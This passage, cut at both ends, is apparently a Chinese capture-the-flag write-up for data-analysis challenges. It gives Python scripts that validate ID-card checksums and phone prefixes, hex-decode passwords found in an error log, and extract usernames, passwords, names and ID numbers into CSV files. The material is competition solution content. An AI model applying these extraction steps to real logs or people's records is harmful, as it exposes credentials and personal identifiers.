class="hljs-comment"># 校验性别与身份证号中的性别</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_sex_and_idcard</span>(<span class="hljs-params">sex, idcard</span>):<br>    gender_digit = <span class="hljs-built_in">int</span>(idcard[-<span class="hljs-number">2</span>])<br>    sex_from_id = <span class="hljs-string">&quot;男&quot;</span> <span class="hljs-keyword">if</span> gender_digit % <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;女&quot;</span><br>    <span class="hljs-keyword">return</span> sex <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-string">&quot;女&quot;</span>&#125; <span class="hljs-keyword">and</span> sex == sex_from_id<br><br><span class="hljs-comment"># 校验手机号码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_phone</span>(<span class="hljs-params">phone</span>):<br>    valid_prefixes = &#123;<span class="hljs-string">&quot;734&quot;</span>, <span class="hljs-string">&quot;735&quot;</span>, <span class="hljs-string">&quot;736&quot;</span>, <span class="hljs-string">&quot;737&quot;</span>, <span class="hljs-string">&quot;738&quot;</span>, <span class="hljs-string">&quot;739&quot;</span>, <span class="hljs-string">&quot;747&quot;</span>, <span class="hljs-string">&quot;748&quot;</span>, <span class="hljs-string">&quot;750&quot;</span>, <span class="hljs-string">&quot;751&quot;</span>, <span class="hljs-string">&quot;752&quot;</span>, <br>                      <span class="hljs-string">&quot;757&quot;</span>, <span class="hljs-string">&quot;758&quot;</span>, <span class="hljs-string">&quot;759&quot;</span>, <span class="hljs-string">&quot;772&quot;</span>, <span class="hljs-string">&quot;778&quot;</span>, <span class="hljs-string">&quot;782&quot;</span>, <span class="hljs-string">&quot;783&quot;</span>, <span class="hljs-string">&quot;784&quot;</span>, <span class="hljs-string">&quot;787&quot;</span>, <span class="hljs-string">&quot;788&quot;</span>, <span class="hljs-string">&quot;795&quot;</span>, <br>                      <span class="hljs-string">&quot;798&quot;</span>, <span class="hljs-string">&quot;730&quot;</span>, <span class="hljs-string">&quot;731&quot;</span>, <span class="hljs-string">&quot;732&quot;</span>, <span class="hljs-string">&quot;740&quot;</span>, <span class="hljs-string">&quot;745&quot;</span>, <span class="hljs-string">&quot;746&quot;</span>, <span class="hljs-string">&quot;755&quot;</span>, <span class="hljs-string">&quot;756&quot;</span>, <span class="hljs-string">&quot;766&quot;</span>, <span class="hljs-string">&quot;767&quot;</span>, <br>                      <span class="hljs-string">&quot;771&quot;</span>, <span class="hljs-string">&quot;775&quot;</span>, <span class="hljs-string">&quot;776&quot;</span>, <span class="hljs-string">&quot;785&quot;</span>, <span class="hljs-string">&quot;786&quot;</span>, <span class="hljs-string">&quot;796&quot;</span>, <span class="hljs-string">&quot;733&quot;</span>, <span class="hljs-string">&quot;749&quot;</span>, <span class="hljs-string">&quot;753&quot;</span>, <span class="hljs-string">&quot;773&quot;</span>, <span class="hljs-string">&quot;774&quot;</span>, <br>                      <span class="hljs-string">&quot;777&quot;</span>, <span class="hljs-string">&quot;780&quot;</span>, <span class="hljs-string">&quot;781&quot;</span>, <span class="hljs-string">&quot;789&quot;</span>, <span class="hljs-string">&quot;790&quot;</span>, <span class="hljs-string">&quot;791&quot;</span>, <span class="hljs-string">&quot;793&quot;</span>, <span class="hljs-string">&quot;799&quot;</span>&#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(phone) == <span class="hljs-number">11</span> <span class="hljs-keyword">and</span> phone[:<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> valid_prefixes <span class="hljs-keyword">and</span> phone.isdigit()<br><br><span class="hljs-comment"># 处理CSV文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_csv</span>(<span class="hljs-params">input_file, invalid_output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>        reader = csv.DictReader(csvfile)<br>        invalid_rows = []<br><br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            username = row[<span class="hljs-string">&#x27;username&#x27;</span>]<br>            name = row[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            sex = row[<span class="hljs-string">&#x27;sex&#x27;</span>]<br>            birth = row[<span class="hljs-string">&#x27;birth&#x27;</span>]<br>            idcard = row[<span class="hljs-string">&#x27;idcard&#x27;</span>]<br>            phone = row[<span class="hljs-string">&#x27;phone&#x27;</span>]<br><br>            <span class="hljs-comment"># 检查所有校验条件，如果有一项不符合就加入无效数据列表</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (validate_username(username) <span class="hljs-keyword">and</span><br>                    validate_name(name) <span class="hljs-keyword">and</span><br>                    validate_idcard(idcard) <span class="hljs-keyword">and</span> <br>                    validate_birth_and_idcard(birth, idcard) <span class="hljs-keyword">and</span> <br>                    validate_sex_and_idcard(sex, idcard) <span class="hljs-keyword">and</span> <br>                    validate_phone(phone)):<br>                invalid_rows.append(row)<br><br>    <span class="hljs-comment"># 写入无效数据到文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(invalid_output_file, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>        fieldnames = [<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;sex&#x27;</span>, <span class="hljs-string">&#x27;birth&#x27;</span>, <span class="hljs-string">&#x27;idcard&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>]<br>        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)<br>        writer.writeheader()<br>        writer.writerows(invalid_rows)<br><br><span class="hljs-comment"># 输入文件和无效数据输出文件路径</span><br>input_file = <span class="hljs-string">&#x27;output.csv&#x27;</span><br>invalid_output_file = <span class="hljs-string">&#x27;output_invalid.csv&#x27;</span><br><br>process_csv(input_file, invalid_output_file)<br><br></code></pre></td></tr></table></figure><h3 id="data-analy3"><a href="#data-analy3" class="headerlink" title="data-analy3"></a>data-analy3</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121047309.png" alt="image.png"><br>第一步将日志中的有用信息提取出来，提取之前，我们需要先看看日志，这里比较有用的就是 error.log<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121047235.png" alt="image.png"><br>先 ctrl+f 找 username，根据题目应该是 username,password,name,idcard,phone，但这里并没看到 password，继续往下看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121048181.png" alt="image.png"><br>可以看到往下没几行有一个经过 hex 编码的字符串以及看着很像密码的数字，放去解码看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121048714.png" alt="image.png"><br>确实是密码，这里我们把 <code>\x </code>这些字符全部换成中文，然后再用<code>\x</code>去找，发现还有这样编码的字符<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121049891.png" alt="image.png"><br>再放去解码看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121049645.png" alt="image.png"><br>还有更新，老规矩，换，然后找<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121050741.png" alt="image.png"><br>这个后面没跟数字<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121050060.png" alt="image.png"><br>也先换，然后继续找会有一些解出来是乱码的，那些不用管，看的不爽直接删了都行，然后还可以看到密码后面都有个 \n，我一开始正则就把 \n 也匹配进去了，这里直接全部替换为空，然后开始分析即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib.parse<br><br>log_file_path = <span class="hljs-string">&#x27;error.log&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> log_file:<br>    log_lines = log_file.readlines()<br><br>entry_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;username=([a-zA-Z0-9]+)&amp;name=([^&amp;]+)&amp;idcard=([0-9X]+)&amp;phone=([0-9]+)&quot;</span>)<br><br>message_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[\u4e00-\u9fa5]+.*[\u4e00-\u9fa5]+.*&quot;</span>)<br><br>extracted_data = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(log_lines)):<br>    entry_match = entry_pattern.search(log_lines[i])<br>    <span class="hljs-keyword">if</span> entry_match:<br>        username = entry_match.group(<span class="hljs-number">1</span>)<br>        name = urllib.parse.unquote(entry_match.group(<span class="hljs-number">2</span>))<br>        idcard = entry_match.group(<span class="hljs-number">3</span>)<br>        phone = entry_match.group(<span class="hljs-number">4</span>)<br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i + <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(log_lines)):<br>            message_match = message_pattern.search(log_lines[j])<br>            <span class="hljs-keyword">if</span> message_match:<br>                message = message_match.group(<span class="hljs-number">0</span>)<br>                extracted_data.append(<span class="hljs-string">f&quot;username=<span class="hljs-subst">&#123;username&#125;</span>, name=<span class="hljs-subst">&#123;name&#125;</span>, idcard=<span class="hljs-subst">&#123;idcard&#125;</span>, phone=<span class="hljs-subst">&#123;phone&#125;</span>\n<span class="hljs-subst">&#123;message&#125;</span>\n\n&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br>txt_file_path = <span class="hljs-string">&#x27;extracted_data.txt&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(txt_file_path, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> txtfile:<br>    txtfile.writelines(extracted_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据已提取并保存到 <span class="hljs-subst">&#123;txt_file_path&#125;</span> 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>input_file_path = <span class="hljs-string">&#x27;extracted_data.txt&#x27;</span><br>output_file_path = <span class="hljs-string">&#x27;filtered_extracted_data.txt&#x27;</span><br><br>entry_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;username=[^,]+, name=[^,]+, idcard=[^,]+, phone=[^,]+\n&quot;</span>)<br>message_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;您输入的用户名不存在！&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br>filtered_data = []<br>skip_next = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lines)):<br>    <span class="hljs-keyword">if</span> skip_next:<br>        skip_next = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">continue</span><br>    <br>    entry_match = entry_pattern.search(lines[i])<br>    <span class="hljs-keyword">if</span> entry_match:<br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(lines) <span class="hljs-keyword">and</span> message_pattern.search(lines[i + <span class="hljs-number">1</span>]):<br>            skip_next = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            filtered_data.append(lines[i])<br>    <span class="hljs-keyword">else</span>:<br>        filtered_data.append(lines[i])<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file_path, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.writelines(filtered_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据已过滤并保存到 <span class="hljs-subst">&#123;output_file_path&#125;</span> 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> csv<br><br>input_file_path = <span class="hljs-string">&#x27;filtered_extracted_data.txt&#x27;</span><br>output_csv_file_path = <span class="hljs-string">&#x27;output_data.csv&#x27;</span><br><br>entry_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;username=(?P&lt;username&gt;[^\s,]+),\s*name=(?P&lt;name&gt;[^\s,]+),\s*idcard=(?P&lt;idcard&gt;[^\s,]+),\s*phone=(?P&lt;phone&gt;[^\s,]+)&quot;</span>)<br>password_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;您的信息(?:录入|更新)成功！您的密码为\s*(?P&lt;password&gt;[^\s]+)&quot;</span>)<br><br>data_rows = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(lines):<br>    entry_match = entry_pattern.search(lines[i])<br>    <span class="hljs-keyword">if</span> entry_match:<br>        username = entry_match.group(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        name = entry_match.group(<span class="hljs-string">&#x27;name&#x27;</span>)<br>        idcard = entry_match.group(<span class="hljs-string">&#x27;idcard&#x27;</span>)<br>        phone = entry_match.group(<span class="hljs-string">&#x27;phone&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(lines):<br>            password_match = password_pattern.search(lines[i + <span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> password_match:<br>                password = password_match.group(<span class="hljs-string">&#x27;password&#x27;</span>)<br>                data_rows.append([username, password, name, idcard, phone])<br>        i += <span class="hljs-number">2</span> <br>    <span class="hljs-keyword">else</span>:<br>        i += <span class="hljs-number">1</span> <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_csv_file_path, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    csv_writer = csv.writer(csvfile)<br>    csv_writer.writerow([<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;idcard&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>]) <br>    csv_writer.writerows(data_rows)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据已提取并保存到 <span class="hljs-subst">&#123;output_csv_file_path&#125;</span> 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_idcard</span>(<span class="hljs-params">idcard</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(idcard) != <span class="hljs-number">18</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;^\d&#123;17&#125;[\dX]$&quot;</span>, idcard):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    factors = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    checksum_map = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>]<br><br>    total = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(idcard[i]) * factors[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>))<br>    checksum = checksum_map[total % <span class="hljs-number">11</span>]<br><br>    <span class="hljs-keyword">return</span> idcard[-<span class="hljs-number">1</span>] == checksum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_phone</span>(<span class="hljs-params">phone</span>):<br>    valid_prefixes = &#123;<span class="hljs-string">&quot;734&quot;</span>, <span class="hljs-string">&quot;735&quot;</span>, <span class="hljs-string">&quot;736&quot;</span>, <span class="hljs-string">&quot;737&quot;</span>, <span class="hljs-string">&quot;738&quot;</span>, <span class="hljs-string">&quot;739&quot;</span>, <span class="hljs-string">&quot;747&quot;</span>, <span class="hljs-string">&quot;748&quot;</span>, <span class="hljs-string">&quot;750&quot;</span>, <span class="hljs-string">&quot;751&quot;</span>, <span class="hljs-string">&quot;752&quot;</span>, <br>                      <span class="hljs-string">&quot;757&quot;</span>, <span class="hljs-string">&quot;758&quot;</span>, <span class="hljs-string">&quot;759&quot;</span>, <span class="hljs-string">&quot;772&quot;</span>, <span class="hljs-string">&quot;778&quot;</span>, <span class="hljs-string">&quot;782&quot;</span>, <span class="hljs-string">&quot;783&quot;</span>, <span class="hljs-string">&quot;784&quot;</span>, <span class="hljs-string">&quot;787&quot;</span>, <span class="hljs-string">&quot;788&quot;</span>, <span class="hljs-string">&quot;795&quot;</span>, <br>                      <span class="hljs-string">&quot;798&quot;</span>, <span class="hljs-string">&quot;730&quot;</span>, <span class="hljs-string">&quot;731&quot;</span>, <span class="hljs-string">&quot;732&quot;</span>, <span class="hljs-string">&quot;740&quot;</span>, <span class="hljs-string">&quot;745&quot;</span>, <span class="hljs-string">&quot;746&quot;</span>, <span class="hljs-string">&quot;755&quot;</span>, <span class="hljs-string">&quot;756&quot;</span>, <span class="hljs-string">&quot;766&quot;</span>, <span class="hljs-string">&quot;767&quot;</span>, <br>                      <span class="hljs-string">&quot;771&quot;</span>, <span class="hljs-string">&quot;775&quot;</span>, <span class="hljs-string">&quot;776&quot;</span>, <span class="hljs-string">&quot;785&quot;</span>, <span class="hljs-string">&quot;786&quot;</span>, <span class="hljs-string">&quot;796&quot;</span>, <span class="hljs-string">&quot;733&quot;</span>, <span class="hljs-string">&quot;749&quot;</span>, <span class="hljs-string">&quot;753&quot;</span>, <span class="hljs-string">&quot;773&quot;</span>, <span class="hljs-string">&quot;774&quot;</span>, <br>                      <span class="hljs-string">&quot;777&quot;</span>, <span class="hljs-string">&quot;780&quot;</span>, <span class="hljs-string">&quot;781&quot;</span>, <span class="hljs-string">&quot;789&quot;</span>, <span class="hljs-string">&quot;790&quot;</span>, <span class="hljs-string">&quot;791&quot;</span>, <span class="hljs-string">&quot;793&quot;</span>, <span class="hljs-string">&quot;799&quot;</span>&#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(phone) == <span class="hljs-number">11</span> <span class="hljs-keyword">and</span> phone[:<span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> valid_prefixes <span class="hljs-keyword">and</span> phone.isdigit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_csv</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>        reader = csv.DictReader(csvfile)<br>        valid_rows = []<br><br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            username = row[<span class="hljs-string">&#x27;username&#x27;</span>]<br>            password = row[<span class="hljs-string">&#x27;password&#x27;</span>]<br>            name = row[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            idcard = row[<span class="hljs-string">&#x27;idcard&#x27;</span>]<br>            phone = row[<span class="hljs-string">&#x27;phone&#x27;</span>]<br>            <br>            <span class="hljs-keyword">if</span> validate_idcard(idcard) <span class="hljs-keyword">and</span> validate_phone(phone):<br>                valid_rows.append(&#123;<br>                    <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>                    <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>                    <span class="hljs-string">&#x27;name&#x27;</span>: name,<br>                    <span class="hljs-string">&#x27;idcard&#x27;</span>: idcard,<br>                    <span class="hljs-string">&#x27;phone&#x27;</span>: phone<br>                &#125;)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>        fieldnames = [<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;idcard&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>]<br>        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)<br>        writer.writeheader()<br>        writer.writerows(valid_rows)<br><br>input_file = <span class="hljs-string">&#x27;output_data.csv&#x27;</span><br>output_file = <span class="hljs-string">&#x27;output_valid.csv&#x27;</span><br><br>process_csv(input_file, output_file)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br>input_file = <span class="hljs-string">&#x27;output_valid.csv&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_duplicates</span>(<span class="hljs-params">input_file</span>):<br><br>    username_count = defaultdict(<span class="hljs-built_in">int</span>)<br>    duplicates = []<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>        reader = csv.DictReader(csvfile)<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            username = row[<span class="hljs-string">&#x27;username&#x27;</span>]<br>            username_count[username] += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> username, count <span class="hljs-keyword">in</span> username_count.items():<br>        <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>            duplicates.append(username)<br><br>    <span class="hljs-keyword">if</span> duplicates:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;重复的用户名:&quot;</span>)<br>        <span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> duplicates:<br>            <span class="hljs-built_in">print</span>(username)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有重复的用户名。&quot;</span>)<br><br>check_duplicates(input_file)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><br><span class="hljs-keyword">def</span> <span 